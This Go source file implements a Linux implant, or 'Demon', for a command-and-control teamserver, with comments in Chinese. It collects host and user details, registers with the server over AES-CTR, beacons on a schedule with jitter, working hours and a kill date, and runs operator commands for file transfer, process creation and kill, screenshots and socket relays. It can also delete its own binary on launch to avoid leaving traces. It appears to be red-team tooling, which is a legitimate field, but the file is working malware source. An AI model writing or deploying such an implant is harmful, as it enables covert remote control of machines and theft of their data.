package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Linux Demon：注册、心跳与包收发。
// 协议与 Windows C Demon 完全一致：
//
//	请求：[size][0xdeadbeef][agentID][command][requestID][AES-CTR(其余全部)]
//	响应：[command][requestID][size][AES-CTR(payload)] * N
//
// 仅用于已获得明确书面授权的测试环境。

const demonMagic = 0xDEADBEEF

const (
	cmdGetJob     = 1
	cmdNoJob      = 10
	cmdSleep      = 11
	cmdProcList   = 12
	cmdFS         = 15
	cmdJob        = 21
	cmdProc       = 0x1010
	cmdMemFile    = 2560
	cmdConfig     = 2500
	cmdScreenshot = 2510
	cmdSocket     = 2540

	demonInit    = 99
	cmdCheckin   = 100
	cmdOutput    = 90
	cmdError     = 91
	cmdExit      = 92
	cmdKillDate  = 93
	beaconOutput = 94

	errWin32LastError = 1
	errOS             = 4 // Linux Demon 扩展：通用 OS 错误 + 文本消息

	// FS 子命令
	fsDir      = 1
	fsDownload = 2
	fsUpload   = 3
	fsCd       = 4
	fsRemove   = 5
	fsMkdir    = 6
	fsCopy     = 7
	fsMove     = 8
	fsPwd      = 9
	fsCat      = 10

	// PROC 子命令（与 C Demon 的 Command.h 一致）
	procModules = 2
	procGrep    = 3
	procCreate  = 4
	procBlock   = 5
	procMemory  = 6
	procKill    = 7

	// PROCESS_ARCH_* 与 teamserver 的映射
	archUnknown = 0
	archX86     = 1
	archX64     = 2
	archIA64    = 3

	// OS_ARCH（teamserver 的 switch）
	osArchX86   = 0
	osArchX64   = 9
	osArchARM   = 5
	osArchARM64 = 12
)

type session struct {
	agentID int32

	aesKey []byte
	aesIV  []byte

	hostname   string
	username   string
	domain     string
	internalIP string
	process    string
	pid        int
	ppid       int
	tid        int
	procArch   int
	osArch     int
	elevated   bool
	osName     string

	sleep        int
	jitter       int
	killDate     int64
	workingHours int32

	connected bool
}

var (
	inst     = &session{}
	outMu    sync.Mutex
	outQueue []outPkg
)

// outPkg 是暂存在队列里的“待回传包”，会在下一次心跳里发送。
type outPkg struct {
	cmd  uint32
	req  uint32
	data []byte
}

func enqueue(cmd, req uint32, data []byte) {
	outMu.Lock()
	outQueue = append(outQueue, outPkg{cmd: cmd, req: req, data: data})
	outMu.Unlock()
}

func takeQueue() []outPkg {
	outMu.Lock()
	q := outQueue
	outQueue = nil
	outMu.Unlock()
	return q
}

func queueLen() int {
	outMu.Lock()
	defer outMu.Unlock()
	return len(outQueue)
}

func main() {
	// 基础信息采集
	inst.aesKey = randomBytes(32)
	inst.aesIV = randomBytes(16)
	var idb [4]byte
	rand.Read(idb[:])
	inst.agentID = int32(binary.LittleEndian.Uint32(idb[:]) & 0x7fffffff)

	inst.hostname, _ = os.Hostname()
	inst.username = currentUser()
	inst.domain = domainName()
	inst.internalIP = internalIP()
	inst.process = processPath()
	inst.pid = os.Getpid()
	inst.ppid = os.Getppid()
	inst.tid = inst.pid
	inst.procArch = detectProcArch()
	inst.osArch = detectOSArch()
	inst.elevated = os.Geteuid() == 0
	inst.osName = osVersionName()

	// 通过 /slt 投递时由脚本设置：启动即删除自身，避免落地文件残留，
	// 也避免脚本在 exec 完成前删除文件导致的竞态。
	if os.Getenv("DEMON_SELF_DELETE") == "1" {
		if exe, err := os.Executable(); err == nil {
			_ = os.Remove(exe)
		}
	}

	cfg := cfg()
	inst.sleep = cfg.Sleep
	inst.jitter = cfg.Jitter
	inst.killDate = cfg.KillDate
	inst.workingHours = cfg.WorkingHours

	if inst.sleep < 0 {
		inst.sleep = 0
	}
	if inst.jitter < 0 {
		inst.jitter = 0
	}
	if inst.jitter > 100 {
		inst.jitter = 100
	}

	initTransport()

	for {
		if !inst.connected {
			if err := register(); err != nil {
				sleepWithJitter()
				continue
			}
			inst.connected = true
		}

		if reachedKillDate() {
			enqueue(cmdKillDate, 0, nil)
			_ = flushOne()
			os.Exit(0)
		}

		if !inWorkingHours() {
			sleepWithJitter()
			continue
		}

		if err := beacon(); err != nil {
			inst.connected = false
			sleepWithJitter()
			continue
		}

		// 有待回传的数据就立刻再发一次，避免输出延迟一个 sleep 周期
		if queueLen() == 0 {
			sleepWithJitter()
		} else {
			time.Sleep(50 * time.Millisecond)
		}
	}
}

// ---------------------------------------------------------------------------
// 注册 / 心跳
// ---------------------------------------------------------------------------

func metadataPlain() []byte {
	p := newPacker()
	p.i32(inst.agentID)
	p.text(inst.hostname)
	p.text(inst.username)
	p.text(inst.domain)
	p.text(inst.internalIP)
	p.wstr(inst.process)
	p.i32(int32(inst.pid))
	p.i32(int32(inst.tid))
	p.i32(int32(inst.ppid))
	p.i32(int32(inst.procArch))
	p.boolean(inst.elevated)
	p.i64(0) // BaseAddress：Linux 无意义
	p.i32(0) // OS major
	p.i32(0) // OS minor
	p.i32(0) // product type
	p.i32(0) // service pack
	p.i32(0) // build
	p.i32(int32(inst.osArch))
	p.i32(int32(inst.sleep))
	p.i32(int32(inst.jitter))
	p.i64(inst.killDate)
	p.i32(inst.workingHours)
	// Linux 扩展：platform + 系统名（teamserver 端按可选尾部字段解析）
	p.i32(2)
	p.text(inst.osName)
	return p.b
}

func register() error {
	plain := metadataPlain()
	// 前 48 字节是明文 key/iv，其余部分加密（与 C Demon 一致）
	body := newPacker()
	body.u32(demonInit)
	body.u32(0)
	body.b = append(body.b, inst.aesKey...)
	body.b = append(body.b, inst.aesIV...)
	body.b = append(body.b, plain...)

	reply, err := transmit(body.b, 8+48) // DEMON_INIT：key/iv 明文，之后才加密
	if err != nil {
		return err
	}
	dec := aesCTR(inst.aesKey, inst.aesIV, reply)
	if len(dec) < 4 {
		return fmt.Errorf("short registration reply")
	}
	if int32(binary.LittleEndian.Uint32(dec)) != inst.agentID {
		return fmt.Errorf("registration rejected")
	}
	return nil
}

// beacon 发送一次 GET_JOB + 队列中的输出包，并处理返回的任务。
func beacon() error {
	pkgs := takeQueue()
	return sendBatch(pkgs, true)
}

func flushOne() error {
	return sendBatch(takeQueue(), false)
}

func sendBatch(pkgs []outPkg, withGetJob bool) error {
	entries := newPacker()
	if withGetJob {
		entries.u32(cmdGetJob)
		entries.u32(0)
	}
	for _, pkg := range pkgs {
		entries.u32(pkg.cmd)
		entries.u32(pkg.req)
		entries.bytes(pkg.data)
	}

	reply, err := transmit(entries.b, 8)
	if err != nil {
		return err
	}
	handleReply(reply)
	return nil
}

// transmit 把 entries（明文）按 Demon 包头封装、整体加密后 POST。
func transmit(entries []byte, plainPrefix int) ([]byte, error) {
	if len(entries) < 8 {
		// 至少要有第一组 command/requestID 供 teamserver 解析
		e := newPacker().u32(cmdGetJob).u32(0)
		entries = append(e.b, entries...)
	}
	if plainPrefix > len(entries) {
		plainPrefix = 8
	}

	// 加密从第一组 cmd/req 之后开始（teamserver 读取 cmd/req 后解密其余部分）。
	// 注册包例外：key/iv 必须保持明文，加密从其后开始。
	enc := aesCTR(inst.aesKey, inst.aesIV, entries[plainPrefix:])

	body := newPacker()
	body.u32(0) // size 占位
	body.u32(demonMagic)
	body.u32(uint32(inst.agentID))
	body.b = append(body.b, entries[:plainPrefix]...)
	body.b = append(body.b, enc...)

	binary.BigEndian.PutUint32(body.b[0:4], uint32(len(body.b)-4))
	return postPackage(body.b)
}

func handleReply(reply []byte) {
	p := &parser{b: reply}
	for p.remaining() >= 12 {
		cmd := uint32(binary.LittleEndian.Uint32(p.b[p.pos:]))
		p.pos += 4
		req := uint32(binary.LittleEndian.Uint32(p.b[p.pos:]))
		p.pos += 4
		size := int(binary.LittleEndian.Uint32(p.b[p.pos:]))
		p.pos += 4
		if size < 0 || p.pos+size > len(p.b) {
			return
		}
		payload := aesCTR(inst.aesKey, inst.aesIV, p.b[p.pos:p.pos+size])
		p.pos += size
		if cmd == cmdNoJob {
			continue
		}
		dispatch(cmd, req, payload)
	}
}

// ---------------------------------------------------------------------------
// 任务分发
// ---------------------------------------------------------------------------

func dispatch(cmd uint32, req uint32, data []byte) {
	defer func() {
		if r := recover(); r != nil {
			sendError(req, fmt.Sprintf("command 0x%x panic: %v", cmd, r))
		}
	}()

	p := newParser(data)
	switch cmd {
	case cmdCheckin:
		sendCheckin(req)
	case cmdSleep:
		delay := p.i32()
		jitter := p.i32()
		if delay < 0 {
			delay = 0
		}
		if jitter < 0 {
			jitter = 0
		}
		if jitter > 100 {
			jitter = 100
		}
		inst.sleep = int(delay)
		inst.jitter = int(jitter)
		out := newPacker()
		out.i32(delay)
		out.i32(jitter)
		enqueue(cmdSleep, req, out.b)
	case cmdExit:
		method := p.i32()
		out := newPacker()
		out.i32(method)
		enqueue(cmdExit, req, out.b)
		_ = sendBatch(takeQueue(), false)
		os.Exit(0)
	case cmdFS:
		handleFS(p, req)
	case cmdProc:
		handleProc(p, req)
	case cmdProcList:
		handleProcList(p, req)
	case cmdMemFile:
		handleMemFile(p, req)
	case cmdScreenshot:
		handleScreenshot(req)
	case cmdSocket:
		handleSocket(p, req)
	case cmdConfig:
		// 配置查询/修改：Linux 版本仅回显当前 sleep/jitter
		out := newPacker()
		out.i32(0)
		out.i32(int32(inst.sleep))
		out.i32(int32(inst.jitter))
		enqueue(cmdConfig, req, out.b)
	default:
		sendError(req, fmt.Sprintf("command 0x%x is not supported by the Linux demon", cmd))
	}
}

func sendError(req uint32, msg string) {
	p := newPacker()
	p.i32(errOS)
	p.text(msg)
	enqueue(cmdError, req, p.b)
}

func sendOutput(req uint32, text string) {
	p := newPacker()
	p.text(text)
	enqueue(cmdOutput, req, p.b)
}

func sendCheckin(req uint32) {
	plain := metadataPlain()
	body := newPacker()
	body.b = append(body.b, inst.aesKey...)
	body.b = append(body.b, inst.aesIV...)
	body.b = append(body.b, plain...)
	enqueue(cmdCheckin, req, body.b)
}

// ---------------------------------------------------------------------------
// 环境信息
// ---------------------------------------------------------------------------

func currentUser() string {
	if u, err := user.Current(); err == nil && u.Username != "" {
		return u.Username
	}
	return os.Getenv("USER")
}

func domainName() string {
	// Linux 没有 Windows 域概念，保留 hostname 便于 UI 展示
	return ""
}

func processPath() string {
	if exe, err := os.Executable(); err == nil {
		if p, err := filepath.Abs(exe); err == nil {
			return p
		}
		return exe
	}
	return "demon"
}

func detectProcArch() int {
	switch runtime.GOARCH {
	case "amd64":
		return archX64
	case "386":
		return archX86
	case "arm64":
		return archX64 // teamserver 只会把 2 显示为 x64
	default:
		return archUnknown
	}
}

func detectOSArch() int {
	switch runtime.GOARCH {
	case "amd64":
		return osArchX64
	case "386":
		return osArchX86
	case "arm":
		return osArchARM
	case "arm64":
		return osArchARM64
	default:
		return osArchX64
	}
}

func osVersionName() string {
	if b, err := os.ReadFile("/etc/os-release"); err == nil {
		var pretty string
		for _, line := range strings.Split(string(b), "\n") {
			if strings.HasPrefix(line, "PRETTY_NAME=") {
				pretty = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
			}
		}
		if pretty != "" {
			return "Linux " + pretty
		}
	}
	if b, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {
		return "Linux " + strings.TrimSpace(string(b))
	}
	return "Linux " + runtime.GOARCH
}

func internalIP() string {
	if conn, err := netDialUDP(); err == nil {
		defer conn.Close()
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok && addr.IP != nil && !addr.IP.IsLoopback() {
			return addr.IP.String()
		}
	}
	return internalIPFromInterfaces()
}

func sleepWithJitter() {
	base := inst.sleep
	if base <= 0 {
		base = 1
	}
	ms := base * 1000
	if inst.jitter > 0 {
		delta := ms * inst.jitter / 100
		if delta > 0 {
			n, err := rand.Int(rand.Reader, big.NewInt(int64(2*delta+1)))
			if err == nil {
				ms = ms - delta + int(n.Int64())
			}
		}
	}
	if ms < 250 {
		ms = 250
	}
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func reachedKillDate() bool {
	return inst.killDate > 0 && time.Now().Unix() > inst.killDate
}

func inWorkingHours() bool {
	wh := inst.workingHours
	if (wh>>22)&1 == 0 {
		return true
	}
	startHour := (wh >> 17) & 0x1f
	startMin := (wh >> 11) & 0x3f
	endHour := (wh >> 6) & 0x1f
	endMin := wh & 0x3f

	now := time.Now()
	if now.Hour() < int(startHour) || now.Hour() > int(endHour) {
		return false
	}
	if now.Hour() == int(startHour) && now.Minute() < int(startMin) {
		return false
	}
	if now.Hour() == int(endHour) && now.Minute() > int(endMin) {
		return false
	}
	return true
}
